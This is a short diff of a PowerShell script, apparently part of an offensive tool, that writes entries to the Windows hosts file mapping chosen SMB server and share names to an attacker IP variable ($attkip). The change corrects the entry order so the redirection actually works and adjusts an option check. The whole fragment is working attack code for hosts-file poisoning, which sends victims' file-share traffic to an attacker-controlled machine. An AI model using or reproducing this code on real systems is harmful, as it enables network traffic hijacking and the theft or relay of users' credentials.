@@ -1253,7 +1253,7 @@ $srv = $i.Substring(0, $i.lastIndexOf('\'))
 $srv = $srv.trim('\\')
 
 
-try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "$srv `t $attkip"}catch{Write-Output "error occured"}
+try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "$attkip `t $srv"}catch{Write-Output "error occured"}
 
 }
 
@@ -1264,16 +1264,16 @@ if ($whichshare -lt $finalopt){
 
 $shre = $smbds[$whichshare]
 
-try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "$shre `t $attkip"}catch{Write-Output "error occured"} 
+try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "$attkip `t $shre"}catch{Write-Output "error occured"} 
 
 }
 
-else{
 
-Write-Output "No Option Selected"
+if ($whichshare -gt $finalopt){ 
+
+Write-Output "No option selected"
 
 }
-
 
 
 
